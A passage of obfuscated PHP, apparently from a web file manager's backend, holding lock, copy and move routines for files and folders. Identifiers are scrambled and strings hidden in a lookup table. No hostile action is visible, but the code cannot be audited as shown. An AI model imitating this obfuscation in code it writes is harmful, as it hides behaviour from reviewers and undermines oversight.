$_SERVER[ÏÒ Ì„]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÇûŸÒË[544], $ƒ¬Ş•Ä®); $áâÁƒ³œ = 1; $this->_lockKey($ÇûŸÒË[548] . $ƒ¬Ş•Ä® . $ÇûŸÒË[95] . $—à…®Ø, $áâÁƒ³œ); $this->_lockEvent($ƒ¬Ş•Ä®, array($ÇûŸÒË[543], $ÇûŸÒË[545]), $áâÁƒ³œ); $this->_lockParent($ƒ¬Ş•Ä®, array($ÇûŸÒË[543], $ÇûŸÒË[545]), $áâÁƒ³œ); $this->_lockCheckEnd($ÇûŸÒË[544], $ƒ¬Ş•Ä®); } public function lockWriteEnd($Õ›æÚ¯, $•·İ ­È = '') { $¯¤¨Îİí =& $_SERVER[ÏÒ Ì„]; if (!$this->allowLock()) { return; } $×¸æìíõ = 0; $this->_lockKey($¯¤¨Îİí[548] . $Õ›æÚ¯ . $¯¤¨Îİí[95] . $•·İ ­È, $×¸æìíõ); $this->_lockEvent($Õ›æÚ¯, array($¯¤¨Îİí[543], $¯¤¨Îİí[545]), $×¸æìíõ); $this->_lockParent($Õ›æÚ¯, array($¯¤¨Îİí[543], $¯¤¨Îİí[545]), $×¸æìíõ); } public function lockMoveStart($¬ığ¨¢) { $å µ¦ä¾ =& $_SERVER[ÏÒ Ì„]; if (!$this->allowLock()) { return; } $this->_lockCheck($å µ¦ä¾[545], $¬ığ¨¢); $™Êï‹û  = 1; $this->_lockKey($å µ¦ä¾[549] . $¬ığ¨¢, $™Êï‹û ); $this->_lockEvent($¬ığ¨¢, array($å µ¦ä¾[543], $å µ¦ä¾[544]), $™Êï‹û ); $this->_lockParent($¬ığ¨¢, array($å µ¦ä¾[543], $å µ¦ä¾[545]), $™Êï‹û ); $this->_lockEvent($¬ığ¨¢, array($å µ¦ä¾[550], $å µ¦ä¾[546], $å µ¦ä¾[547]), $™Êï‹û ); $this->_lockCheckEnd($å µ¦ä¾[545], $¬ığ¨¢); } public function lockMoveEnd($±ù’†ƒ†) { $±¾±»óŸ =& $_SERVER[ÏÒ Ì„]; if (!$this->allowLock()) { return; } $ûÀòéƒ = 0; $this->_lockKey($±¾±»óŸ[549] . $±ù’†ƒ†, $ûÀòéƒ); $this->_lockEvent($±ù’†ƒ†, array($±¾±»óŸ[543], $±¾±»óŸ[544]), $ûÀòéƒ); $this->_lockParent($±ù’†ƒ†, array($±¾±»óŸ[543], $±¾±»óŸ[545]), $ûÀòéƒ); $this->_lockEvent($±ù’†ƒ†, array($±¾±»óŸ[550], $±¾±»óŸ[546], $±¾±»óŸ[547]), $ûÀòéƒ); } private function _lockCheck($Õ²£íİŠ, $§´ŸÕ°¹) { $Í’—Ó£ø =& $_SERVER[ÏÒ Ì„]; $±îÌ¥ñâ = $this->sourceInfo($§´ŸÕ°¹); $´¬ª = $Õ²£íİŠ . $Í’—Ó£ø[95] . $§´ŸÕ°¹; $this->_lockTimeStart[$´¬ª] = timeFloat(); if (!is_array($±îÌ¥ñâ)) { return; } $ëÄı†¨è = LNG($Í’—Ó£ø[551]); CacheLock::setErrorMsg($Í’—Ó£ø[160] . htmlspecialchars($±îÌ¥ñâ[$Í’—Ó£ø[28]]) . $Í’—Ó£ø[530] . $ëÄı†¨è); $this->_lockKey($´¬ª, 1); $this->_lockKey($´¬ª, 0); $û™¼Ë˜Ç = array_reverse($this->parentLevelArray($±îÌ¥ñâ[$Í’—Ó£ø[515]])); foreach ($û™¼Ë˜Ç as $·¼†úß€) { $´¬ª = $Õ²£íİŠ . $Í’—Ó£ø[552] . $·¼†úß€; if (CacheLock::lockGet($Í’—Ó£ø[553] . $´¬ª)) { $±îÌ¥ñâ = $this->sourceInfo($·¼†úß€); CacheLock::setErrorMsg($Í’—Ó£ø[160] . htmlspecialchars($±îÌ¥ñâ[$Í’—Ó£ø[28]]) . $Í’—Ó£ø[530] . $ëÄı†¨è); $this->_lockKey($´¬ª, 1); $this->_lockKey($´¬ª, 0); } } } private function _lockCheckEnd($…ã…·Ç, $¡Ş÷³Î¸) { $şµ¥ö =& $_SERVER[ÏÒ Ì„]; $ÃâÖñ†Ê = $…ã…·Ç . $şµ¥ö[95] . $¡Ş÷³Î¸; CacheLock::setErrorMsg($şµ¥ö[376]); if (!isset($this->_lockTimeStart[$ÃâÖñ†Ê])) { return; } $ÔÖÅÑùÇ = timeFloat() - $this->_lockTimeStart[$ÃâÖñ†Ê]; unset($this->_lockTimeStart[$ÃâÖñ†Ê]); if ($ÔÖÅÑùÇ > 0.5) { unset(self::$cacheSourceInfo[$şµ¥ö[452] . $¡Ş÷³Î¸]); } $†·ùÄËã = $this->sourceInfo($¡Ş÷³Î¸); if (!$†·ùÄËã) { show_json(LNG($şµ¥ö[105]), !1); } } private function _lockParent($ßÇ¥«•ó, $ÄÎÏàÌ„, $„™Ñğœ¤) { if (!$this->autoLockSet) { return; } $Õ¨ºé”¶ = $this->sourceInfo($ßÇ¥«•ó); if (!is_array($Õ¨ºé”¶)) { return; } $ï¦¢šš = array_reverse($this->parentLevelArray($Õ¨ºé”¶[$_SERVER[ÏÒ Ì„][515]])); foreach ($ï¦¢šš as $Ù²ğõ¥¨) { $this->_lockEvent($Ù²ğõ¥¨, $ÄÎÏàÌ„, $„™Ñğœ¤); } } private function _lockEvent($ûşü„ç, $æìâƒÒ’, $Àğª¸Õç) { $¤øÊıÄó =& $_SERVER[ÏÒ Ì„]; if (!$this->autoLockSet) { return; } foreach ($æìâƒÒ’ as $Ïìş­‡…) { $ì¿æ‘ = $Ïìş­‡… . $¤øÊıÄó[95] . $ûşü„ç; if ($Àğª¸Õç && CacheLock::lockGet($¤øÊıÄó[553] . $ì¿æ‘)) { continue; } $this->_lockKey($ì¿æ‘, $Àğª¸Õç); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($¶’óÑ¿â, $¹€æ—³¨ = 1) { $ÔñßÒ£ã = $_SERVER[ÏÒ Ì„][553] . md5($¶’óÑ¿â); if ($¹€æ—³¨) { if (isset(self::$_lockItemArr[$ÔñßÒ£ã])) { return; } self::$_lockItemArr[$ÔñßÒ£ã] = 1; CacheLock::lock($ÔñßÒ£ã, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ÔñßÒ£ã])) { return; } unset(self::$_lockItemArr[$ÔñßÒ£ã]); CacheLock::unlock($ÔñßÒ£ã); } } public function isParentOf($ÌÃ¯ÒÌè, $´Şá°Éû) { $¸†ÙûÊÊ =& $_SERVER[ÏÒ Ì„]; $Œ¬³ì½ë = $this->sourceInfo($ÌÃ¯ÒÌè); $ÎÅş­ÆÓ = $this->sourceInfo($´Şá°Éû); $š‘±ò”œ = $Œ¬³ì½ë[$¸†ÙûÊÊ[515]] . $Œ¬³ì½ë[$¸†ÙûÊÊ[397]] . $¸†ÙûÊÊ[47]; $ó´›âÕ = $ÎÅş­ÆÓ[$¸†ÙûÊÊ[515]] . $ÎÅş­ÆÓ[$¸†ÙûÊÊ[397]] . $¸†ÙûÊÊ[47]; $ŠêÊ‹ı = strpos($ó´›âÕ, $š‘±ò”œ) === 0; return $ŠêÊ‹ı; } private $targetIsDelete = 0; public function copy($¾œÀ™ëÁ, $üä‹º¯ , $¦Ê¶œåÂ = REPEAT_REPLACE, $•ëœ­ÌÙ = '') { $àáóï =& $_SERVER[ÏÒ Ì„]; $‘ñÍô­á = $this->sourceInfo($¾œÀ™ëÁ); $øßÚ©›Ä = $this->sourceInfo($üä‹º¯ ); if (!$‘ñÍô­á || !$øßÚ©›Ä || $øßÚ©›Ä[$àáóï[405]] != $àáóï[87]) { return !1; } if ($this->isParentOf($¾œÀ™ëÁ, $üä‹º¯ )) { return !1; } $ÕèÊ²öÌ = $•ëœ­ÌÙ ? $•ëœ­ÌÙ : $‘ñÍô­á[$àáóï[28]]; $this->lockCopyStart($¾œÀ™ëÁ); $this->lockWriteStart($üä‹º¯ , $ÕèÊ²öÌ); $¾·àø¤‚ = array($àáóï[554] => array(), $àáóï[555] => array(), $àáóï[556] => array()); $this->targetIsDelete = intval($‘ñÍô­á[$àáóï[425]]); $¾ÖÑêÃ• = $this->fileNameExistCache($üä‹º¯ , $‘ñÍô­á[$àáóï[28]]); $Ó›©ç²· = $this->_copy($¾œÀ™ëÁ, $üä‹º¯ , $¦Ê¶œåÂ, $¾·àø¤‚, !0, $•ëœ­ÌÙ); $this->_childrenListClear(); $this->lockCopyEnd($¾œÀ™ëÁ); $this->lockWriteEnd($üä‹º¯ , $ÕèÊ²öÌ); if ($‘ñÍô­á[$àáóï[405]] == $àáóï[87] && $¾ÖÑêÃ• == $Ó›©ç²·) { $this->folderSizeResetChildren($¾ÖÑêÃ•); } Model($àáóï[557])->addAll($¾·àø¤‚[$àáóï[555]], array(), !0); if ($¾ÖÑêÃ• != $Ó›©ç²· || $‘ñÍô­á[$àáóï[405]] == $àáóï[87]) { Model($àáóï[558])->eventCopy($Ó›©ç²·); } $this->saveAll($¾·àø¤‚[$àáóï[556]]); Model($àáóï[193])->linkAdd($¾·àø¤‚[$àáóï[554]]); $this->folderSizeReset($üä‹º¯ ); $this->updateModifyTime($üä‹º¯ ); return $Ó›©ç²·; } private function _copy($š©‹ÚğŠ, $±ş×Šîß, $õ¡¦’†ˆ, &$‚¯Ê¼Å, $°´è‹ãÏ, $˜›Úôíß = '') { $‚ÚùêÙı =& $_SERVER[ÏÒ Ì„]; $¦‰¹ô¾ = $this->sourceInfoCache($š©‹ÚğŠ); $¿¨—£ = $¦‰¹ô¾[$‚ÚùêÙı[405]] == $‚ÚùêÙı[87]; $¼¤à°ÂÒ = $˜›Úôíß ? $˜›Úôíß : $¦‰¹ô¾[$‚ÚùêÙı[28]]; $›ÉáÓ·è = $this->fileNameExistCache($±ş×Šîß, $¼¤à°ÂÒ); if ($°´è‹ãÏ) { $this->_childrenAllMake($š©‹ÚğŠ); if ($¿¨—£ && $›ÉáÓ·è) { $this->_childrenAllMake($›ÉáÓ·è); } } if (!$›ÉáÓ·è) { return $this->_copyCreate($š©‹ÚğŠ, $±ş×Šîß, $¼¤à°ÂÒ, $‚¯Ê¼Å); } $ßÆª¥îé = $›ÉáÓ·è; if ($¿¨—£) { if ($õ¡¦’†ˆ == REPEAT_RENAME_FOLDER) { $¼¤à°ÂÒ = $this->fileNameAutoCache($±ş×Šîß, $¼¤à°ÂÒ, $õ¡¦’†ˆ, $¿¨—£); $ßÆª¥îé = $this->_copyCreate($š©‹ÚğŠ, $±ş×Šîß, $¼¤à°ÂÒ, $‚¯Ê¼Å); } else { $µÅÆí¥ = $this->_childrenList($š©‹ÚğŠ); foreach ($µÅÆí¥ as $Ê¹´ùïÈ) { $this->_copy($Ê¹´ùïÈ[$‚ÚùêÙı[397]], $›ÉáÓ·è, $õ¡¦’†ˆ, $‚¯Ê¼Å, !1); } } } else { if ($õ¡¦’†ˆ == REPEAT_RENAME || $õ¡¦’†ˆ == REPEAT_RENAME_FOLDER) { $¼¤à°ÂÒ = $this->fileNameAutoCache($±ş×Šîß, $¼¤à°ÂÒ, $õ¡¦’†ˆ, $¿¨—£); $ßÆª¥îé = $this->_copyCreate($š©‹ÚğŠ, $±ş×Šîß, $¼¤à°ÂÒ, $‚¯Ê¼Å); } else { if ($õ¡¦’†ˆ == REPEAT_REPLACE) { $ï²Üá¥» = $this->sourceInfoCache($›ÉáÓ·è); $Ä“‰æŒ = $this->fileHistory($ï²Üá¥», $¦‰¹ô¾[$‚ÚùêÙı[461]], $¦‰¹ô¾[$‚ÚùêÙı[78]]); if ($Ä“‰æŒ) { $‚¯Ê¼Å[$‚ÚùêÙı[554]][] = $¦‰¹ô¾[$‚ÚùêÙı[461]]; } } else { if ($õ¡¦’†ˆ == REPEAT_SKIP) { } } } Hook::trigger($‚ÚùêÙı[559], array($‚ÚùêÙı[560], $¦‰¹ô¾, 0)); } return $ßÆª¥îé; } private function _copyCreate($×ã³ÉˆÙ, $˜Ø¬Ïƒ , $×ÖÑ‡åÌ, &$ê¦ÌºÕ‡) { $‚ºµ‰·ù =& $_SERVER[ÏÒ Ì„]; $ÅêğŠŠ = $this->sourceInfoCache($×ã³ÉˆÙ); $ ·®ÒÛ÷ = $this->sourceInfoCache($˜Ø¬Ïƒ ); $”ûıø¼Á = $this->_makeItemData($ÅêğŠŠ, $ ·®ÒÛ÷, $×ÖÑ‡åÌ); Hook::trigger($‚ºµ‰·ù[561], $”ûıø¼Á); Hook::trigger($‚ºµ‰·ù[562], array($‚ºµ‰·ù[563], $”ûıø¼Á, 0)); $á¡áü„’ = $this->add($”ûıø¼Á); $ãü‰¯¿Š = array($‚ºµ‰·ù[397] => $á¡áü„’, $‚ºµ‰·ù[28] => $×ÖÑ‡åÌ); $this->_copyApplyMeta($ãü‰¯¿Š, $ê¦ÌºÕ‡); if ($ÅêğŠŠ[$‚ºµ‰·ù[405]] != $‚ºµ‰·ù[87]) { $ê¦ÌºÕ‡[$‚ºµ‰·ù[554]][] = $ÅêğŠŠ[$‚ºµ‰·ù[461]]; return $á¡áü„’; } $ô•¢¿‚È = array(); $¥ŞšÏÜã = array(); $this->_childrenListAll($×ã³ÉˆÙ, $ô•¢¿‚È); $µ‡úË–° = count($ô•¢¿‚È); if ($µ‡úË–° == 0) { return $á¡áü„’; } $”éÏÁüİ = $this->sourceInfo($á¡áü„’); foreach ($ô•¢¿‚È as $­Üöª‘À) { $¶£Á› = $this->_makeItemData($­Üöª‘À, $”éÏÁüİ, $­Üöª‘À[$‚ºµ‰·ù[28]]); $¶£Á›[$‚ºµ‰·ù[515]] = $­Üöª‘À[$‚ºµ‰·ù[515]]; $¥ŞšÏÜã[] = $¶£Á›; } $this->chunkEventSet($‚ºµ‰·ù[564], array($‚ºµ‰·ù[565], $”ûıø¼Á, $µ‡úË–°)); $this->addAll($¥ŞšÏÜã, array(), !1); $İì‡Ğ×ş = $this->where(array($‚ºµ‰·ù[492] => $á¡áü„’))->select(); $Èº’¼ø± = $this->_childrenMakeRelation($ô•¢¿‚È, $İì‡Ğ×ş); $Èº’¼ø±[$×ã³ÉˆÙ] = $á¡áü„’; $ØÏû¬ùò = array(); $ÆÏìˆİ = array(); foreach ($İì‡Ğ×ş as $­Üöª‘À) { $©æ±ö£š = $­Üöª‘À[$‚ºµ‰·ù[397]]; $‹å™‘­Ê = $this->_childrenMatch($Èº’¼ø±, $­Üöª‘À, $”éÏÁüİ); $ØÏû¬ùò[] = array($‚ºµ‰·ù[397], $©æ±ö£š, $‚ºµ‰·ù[492], $‹å™‘­Ê[$‚ºµ‰·ù[492]]); $ÆÏìˆİ[] = array($‚ºµ‰·ù[397], $©æ±ö£š, $‚ºµ‰·ù[515], $‹å™‘­Ê[$‚ºµ‰·ù[515]]); $this->_copyApplyMeta($­Üöª‘À, $ê¦ÌºÕ‡); if ($­Üöª‘À[$‚ºµ‰·ù[405]] != $‚ºµ‰·ù[87]) { $ê¦ÌºÕ‡[$‚ºµ‰·ù[554]][] = $­Üöª‘À[$‚ºµ‰·ù[461]]; } } $this->chunkEventSet($‚ºµ‰·ù[566], array($‚ºµ‰·ù[567], $”ûıø¼Á, $µ‡úË–°)); $this->saveAll($ØÏû¬ùò); $this->chunkEventSet($‚ºµ‰·ù[568], array($‚ºµ‰·ù[569], $”ûıø¼Á, $µ‡úË–°)); $this->saveAll($ÆÏìˆİ); return $á¡áü„’; } private function _childrenMakeRelation($ó‰¸°Ü, $’Çµ‡­ª) { $¨ÍùÄˆó =& $_SERVER[ÏÒ Ì„]; $üøë—…ı = array(); $½€¤Ù» = array(); foreach ($ó‰¸°Ü as $ç€òæÖ) { $ïáÒ—ô = $ç€òæÖ[$¨ÍùÄˆó[28]] . $¨ÍùÄˆó[8] . $ç€òæÖ[$¨ÍùÄˆó[515]]; $üøë—…ı[$ïáÒ—ô] = $ç€òæÖ[$¨ÍùÄˆó[397]]; } foreach ($’Çµ‡­ª as $ç€òæÖ) { $ïáÒ—ô = $ç€òæÖ[$¨ÍùÄˆó[28]] . $¨ÍùÄˆó[8] . $ç€òæÖ[$¨ÍùÄˆó[515]]; $­İºÌü = $üøë—…ı[$ïáÒ—ô]; $½€¤Ù»[$­İºÌü] = $ç€òæÖ[$¨ÍùÄˆó[397]]; } return $½€¤Ù»; } private function _childrenMatch($É´öÂì×, $¦ƒ¿İ±ç, $»òÉÇËõ) { $†ù¡«Æï =& $_SERVER[ÏÒ Ì„]; $¾¬±õŞ— = $»òÉÇËõ[$†ù¡«Æï[515]]; $Øôò»²« = $this->parentLevelArray($¦ƒ¿İ±ç[$†ù¡«Æï[515]]); foreach ($Øôò»²« as $»ÕŸšõø) { if (isset($É´öÂì×[$»ÕŸšõø])) { $¾¬±õŞ— .= $É´öÂì×[$»ÕŸšõø] . $†ù¡«Æï[570]; } } $¾¬±õŞ— = rtrim($¾¬±õŞ—, $†ù¡«Æï[47]) . $†ù¡«Æï[47]; $øùÖâ¨Œ = $this->parentLevelArray($¾¬±õŞ—); $›´ÑÌ¶ = $øùÖâ¨Œ[count($øùÖâ¨Œ) - 1]; return array($†ù¡«Æï[492] => $›´ÑÌ¶, $†ù¡«Æï[515] => $¾¬±õŞ—); } private function _makeItemData($¿Çù•óü, $¡úäà’Ì, $ùãêÎ…«) { $‚§õƒÖ¯ =& $_SERVER[ÏÒ Ì„]; $„Ó¥­¦÷ = array($‚§õƒÖ¯[571] => $¿Çù•óü[$‚§õƒÖ¯[405]], $‚§õƒÖ¯[415] => $ùãêÎ…«, $‚§õƒÖ¯[572] => $¿Çù•óü[$‚§õƒÖ¯[407]] ? $¿Çù•óü[$‚§õƒÖ¯[407]] : $‚§õƒÖ¯[33], $‚§õƒÖ¯[462] => $¿Çù•óü[$‚§õƒÖ¯[461]] ? $¿Çù•óü[$‚§õƒÖ¯[461]] : 0, $‚§õƒÖ¯[573] => $¿Çù•óü[$‚§õƒÖ¯[78]] ? $¿Çù•óü[$‚§õƒÖ¯[78]] : 0, $‚§õƒÖ¯[574] => intval($¡úäà’Ì[$‚§õƒÖ¯[406]]), $‚§õƒÖ¯[575] => intval($¡úäà’Ì[$‚§õƒÖ¯[498]]), $‚§õƒÖ¯[576] => intval(USER_ID), $‚§õƒÖ¯[577] => intval(USER_ID), $‚§õƒÖ¯[396] => intval($¡úäà’Ì[$‚§õƒÖ¯[397]]), $‚§õƒÖ¯[578] => $¡úäà’Ì[$‚§õƒÖ¯[515]] . $¡úäà’Ì[$‚§õƒÖ¯[397]] . $‚§õƒÖ¯[47], $‚§õƒÖ¯[419] => $¿Çù•óü[$‚§õƒÖ¯[84]] ? $¿Çù•óü[$‚§õƒÖ¯[84]] : time(), $‚§õƒÖ¯[424] => 0, $‚§õƒÖ¯[579] => $‚§õƒÖ¯[33]); return $„Ó¥­¦÷; } private function _copyApplyMeta($ÍÑØÉçš, &$»……‚Ï¼) { $†‰ô‚´Ä =& $_SERVER[ÏÒ Ì„]; $üï£º˜Â = $ÍÑØÉçš[$†‰ô‚´Ä[397]]; $¼„¥ÉÉè = $ÍÑØÉçš[$†‰ô‚´Ä[28]]; if (!isset($ÍÑØÉçš[$†‰ô‚´Ä[580]]) || !$ÍÑØÉçš[$†‰ô‚´Ä[580]] || $ÍÑØÉçš[$†‰ô‚´Ä[580]] == $†‰ô‚´Ä[191]) { $»……‚Ï¼[$†‰ô‚´Ä[556]][] = array($†‰ô‚´Ä[397], $üï£º˜Â, $†‰ô‚´Ä[580], short_id($üï£º˜Â)); } if (Input::check($¼„¥ÉÉè, $†‰ô‚´Ä[581])) { $»……‚Ï¼[$†‰ô‚´Ä[555]][] = array($†‰ô‚´Ä[397] => $üï£º˜Â, $†‰ô‚´Ä[93] => $†‰ô‚´Ä[458], $†‰ô‚´Ä[372] => str_replace($†‰ô‚´Ä[50], $†‰ô‚´Ä[33], Pinyin::get($¼„¥ÉÉè))); $»……‚Ï¼[$†‰ô‚´Ä[555]][] = array($†‰ô‚´Ä[397] => $üï£º˜Â, $†‰ô‚´Ä[93] => $†‰ô‚´Ä[457], $†‰ô‚´Ä[372] => Pinyin::get($¼„¥ÉÉè, $†‰ô‚´Ä[582])); } $»……‚Ï¼[$†‰ô‚´Ä[555]][] = array($†‰ô‚´Ä[397] => $üï£º˜Â, $†‰ô‚´Ä[93] => $†‰ô‚´Ä[436], $†‰ô‚´Ä[372] => KodSort::makeStr($¼„¥ÉÉè)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($¼·ºÎãÖ) { $´«šø“¨ =& $_SERVER[ÏÒ Ì„]; $µ×ØŸÛñ = $this->sourceInfo($¼·ºÎãÖ); $œ¨÷‘½ = $´«šø“¨[583]; $é¬˜ã»ª = array($´«šø“¨[515] => array($´«šø“¨[538], $µ×ØŸÛñ[$´«šø“¨[515]] . $¼·ºÎãÖ . $´«šø“¨[539]), $´«šø“¨[425] => $this->targetIsDelete); $øÑï÷´“ = $this->field($œ¨÷‘½)->where($é¬˜ã»ª)->select(); if (!$øÑï÷´“) { return; } $øÑï÷´“ = array_to_keyvalue($øÑï÷´“, $´«šø“¨[397]); foreach ($øÑï÷´“ as $Ô¤„ÇµÒ) { $½¤•½™ = $Ô¤„ÇµÒ[$´«šø“¨[492]]; $¼·ºÎãÖ = $Ô¤„ÇµÒ[$´«šø“¨[397]]; if (!isset($this->_childrenListCache[$¼·ºÎãÖ]) && $Ô¤„ÇµÒ[$´«šø“¨[405]] == $´«šø“¨[87]) { $this->_childrenListCache[$¼·ºÎãÖ] = array(); } if (!isset($this->_childrenListCache[$½¤•½™])) { $this->_childrenListCache[$½¤•½™] = array(); } $this->_childrenListCache[$½¤•½™][$¼·ºÎãÖ] = $Ô¤„ÇµÒ; $this->_childrenItemCache[$¼·ºÎãÖ] = $Ô¤„ÇµÒ; } } private function _childrenListAll($ô«ğ’¹·, &$ª¥Úëá) { $úÜ¿ìÅ€ =& $_SERVER[ÏÒ Ì„]; if (!isset($this->_childrenListCache[$ô«ğ’¹·])) { return; } $í¼Ø‰Ñ‹ = $this->_childrenListCache[$ô«ğ’¹·]; foreach ($í¼Ø‰Ñ‹ as $Å©ù˜™½ => $ÈÔëİª²) { $ª¥Úëá[$Å©ù˜™½] = $ÈÔëİª²; if ($ÈÔëİª²[$úÜ¿ìÅ€[405]] == $úÜ¿ìÅ€[87]) { $this->_childrenListAll($Å©ù˜™½, $ª¥Úëá); } } } private function sourceInfoCache($‚Ööø¦—) { if (isset($this->_childrenItemCache[$‚Ööø¦—])) { return $this->_childrenItemCache[$‚Ööø¦—]; } return $this->sourceInfo($‚Ööø¦—); } private function _childrenList($ÜÚªşß‰) { if (isset($this->_childrenListCache[$ÜÚªşß‰])) { return $this->_childrenListCache[$ÜÚªşß‰]; } return $this->_childrenListSelect($ÜÚªşß‰); } private function _childrenListSelect($£óÊ‹šë) { $ğçøÙäŠ =& $_SERVER[ÏÒ Ì„]; $ÈŠ½àÔ° = array($ğçøÙäŠ[492] => $£óÊ‹šë, $ğçøÙäŠ[425] => $this->targetIsDelete); $ó›¿üä‡ = $this->where($ÈŠ½àÔ°)->select(); $ó›¿üä‡ = $ó›¿üä‡ ? $ó›¿üä‡ : array(); $¦Ìüİ…Í = array_to_keyvalue($ó›¿üä‡, $ğçøÙäŠ[397]); $this->_childrenListCache[$£óÊ‹šë] = $¦Ìüİ…Í; foreach ($¦Ìüİ…Í as $£óÊ‹šë => $Ò‹œÈ…) { $this->_childrenItemCache[$£óÊ‹šë] = $Ò‹œÈ…; } return $¦Ìüİ…Í; } private function fileNameExistCache($”­½÷ò„, $óáÃ‡) { $† ’œÓ° =& $_SERVER[ÏÒ Ì„]; $óáÃ‡ = strtolower($óáÃ‡); $•’âñâ‡ = $this->_childrenList($”­½÷ò„); foreach ($•’âñâ‡ as $çŞ¨Åêû) { if ($óáÃ‡ == strtolower($çŞ¨Åêû[$† ’œÓ°[28]])) { return $çŞ¨Åêû[$† ’œÓ°[397]]; } } return !1; } private function fileNameAutoCache($Ğ¦şßŒ±, $„µŒò‘³, $¾Î±”›, $›éŸ±êÒ) { $ª´«ïŠÑ =& $_SERVER[ÏÒ Ì„]; $ì¸Âº¦× = $this->_childrenList($Ğ¦şßŒ±); $—¤´Ü• = array_to_keyvalue($ì¸Âº¦×, $ª´«ïŠÑ[33], $ª´«ïŠÑ[28]); return $this->fileNameAutoGet($—¤´Ü•, $„µŒò‘³, $¾Î±”›, $›éŸ±êÒ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ÀƒÊŞª¥, $ßÇÌ¹—Š, $å€ŞƒÊ‰ = REPEAT_REPLACE, $ÕÔĞ‹Ö’ = '') { $¸¤ğ¶ò¢ =& $_SERVER[ÏÒ Ì„]; $²ÂÅØï› = $this->sourceInfo($ÀƒÊŞª¥); $½šÒíã¾ = $this->sourceInfo($ßÇÌ¹—Š); if ($²ÂÅØï›[$¸¤ğ¶ò¢[492]] == $½šÒíã¾[$¸¤ğ¶ò¢[397]]) { if ($²ÂÅØï›[$¸¤ğ¶ò¢[425]] == $¸¤ğ¶ò¢[87]) { Model($¸¤ğ¶ò¢[423])->restore(array($ÀƒÊŞª¥)); } if (!$ÕÔĞ‹Ö’ || $ÕÔĞ‹Ö’ == $²ÂÅØï›[$¸¤ğ¶ò¢[28]]) { return $ÀƒÊŞª¥; } } $ŠãŞ¹ı§ = $this->pathInfoMore($ÀƒÊŞª¥); if ($this->isParentOf($ÀƒÊŞª¥, $ßÇÌ¹—Š)) { return !1; } if (!$²ÂÅØï› || !$½šÒíã¾ || $½šÒíã¾[$¸¤ğ¶ò¢[405]] != $¸¤ğ¶ò¢[87]) { return !1; } Hook::trigger($¸¤ğ¶ò¢[584], $ŠãŞ¹ı§); $this->targetIsDelete = intval($²ÂÅØï›[$¸¤ğ¶ò¢[425]]); if ($²ÂÅØï›[$¸¤ğ¶ò¢[492]] == $ßÇÌ¹—Š && $ÕÔĞ‹Ö’ != $²ÂÅØï›[$¸¤ğ¶ò¢[28]]) { $Ööµé¾† = $this->fileNameExist($ßÇÌ¹—Š, $ÕÔĞ‹Ö’); if ($Ööµé¾† && $²ÂÅØï›[$¸¤ğ¶ò¢[405]] == $¸¤ğ¶ò¢[191]) { $Ñ¡Ü„Ï = $this->sourceInfo($Ööµé¾†); $ˆ¥ÚÆÃ› = $this->fileHistory($Ñ¡Ü„Ï, $²ÂÅØï›[$¸¤ğ¶ò¢[461]], $²ÂÅØï›[$¸¤ğ¶ò¢[78]]); if (!$ˆ¥ÚÆÃ›) { Model($¸¤ğ¶ò¢[464])->remove($²ÂÅØï›[$¸¤ğ¶ò¢[461]]); } $this->removeNow($ÀƒÊŞª¥, !1); $this->folderSizeReset($ßÇÌ¹—Š); Hook::trigger($¸¤ğ¶ò¢[585], $ŠãŞ¹ı§); return $Ööµé¾†; } } $‚ØÔò¾‚ = $ÕÔĞ‹Ö’ ? $ÕÔĞ‹Ö’ : $²ÂÅØï›[$¸¤ğ¶ò¢[28]]; $this->lockMoveStart($ÀƒÊŞª¥); $this->lockWriteStart($ßÇÌ¹—Š, $‚ØÔò¾‚); $Û£¡¾«¦ = array($¸¤ğ¶ò¢[554] => array(), $¸¤ğ¶ò¢[586] => !1); $this->clearShare($ÀƒÊŞª¥, $ßÇÌ¹—Š); $Èö×œ = $this->fileNameExistCache($ßÇÌ¹—Š, $²ÂÅØï›[$¸¤ğ¶ò¢[28]]); $ì©¶†â = $this->_move($ÀƒÊŞª¥, $ßÇÌ¹—Š, $å€ŞƒÊ‰, $Û£¡¾«¦, $ÕÔĞ‹Ö’); $this->sourceCacheClear(); if ($²ÂÅØï›[$¸¤ğ¶ò¢[405]] == $¸¤ğ¶ò¢[87] && $Èö×œ) { $this->folderSizeResetChildren($ì©¶†â); } Model($¸¤ğ¶ò¢[193])->linkAdd($Û£¡¾«¦[$¸¤ğ¶ò¢[554]]); if ($Èö×œ && $Û£¡¾«¦[$¸¤ğ¶ò¢[586]]) { $this->removeNow($ÀƒÊŞª¥, !1); } $this->lockMoveEnd($ÀƒÊŞª¥); $this->lockWriteEnd($ßÇÌ¹—Š, $‚ØÔò¾‚); $this->folderSizeReset($²ÂÅØï›[$¸¤ğ¶ò¢[492]]); $this->folderSizeReset($ßÇÌ¹—Š); $¸ºüğÒÊ = array($²ÂÅØï›[$¸¤ğ¶ò¢[492]], $ßÇÌ¹—Š); if ($²ÂÅØï›[$¸¤ğ¶ò¢[405]] == $¸¤ğ¶ò¢[87]) { $¸ºüğÒÊ[] = $ÀƒÊŞª¥; } $this->updateModifyTime($¸ºüğÒÊ); Model($¸¤ğ¶ò¢[558])->eventMove($ÀƒÊŞª¥, $²ÂÅØï›[$¸¤ğ¶ò¢[492]], $ßÇÌ¹—Š); Hook::trigger($¸¤ğ¶ò¢[585], $ŠãŞ¹ı§); return $ì©¶†â; } private function _move($•Ãà’Æ, $Ï®¡Ü„‚, $ÚáĞØ¾¿, &$–ß”¢’, $¿Ëò»ãâ = '') { $²ú¬±­‡ =& $_SERVER[ÏÒ Ì„]; $¡“ëş«ş = $this->sourceInfo($•Ãà’Æ); $¯ëŒŸ¶„ = $¡“ëş«ş[$²ú¬±­‡[405]] == $²ú¬±­‡[87]; $–³êÕçÀ = $¿Ëò»ãâ ? $¿Ëò»ãâ : $¡“ëş«ş[$²ú¬±­‡[28]]; $‰¦™©‡¹ = $this->fileNameExistCache($Ï®¡Ü„‚, $–³êÕçÀ); $this->lockMoveStart($•Ãà’Æ); $this->lockWriteStart($Ï®¡Ü„‚, $–³êÕçÀ); if (!$‰¦™©‡¹) { return $this->_moveForce($•Ãà’Æ, $Ï®¡Ü„‚, $–³êÕçÀ); } $ğ›Šæäí = 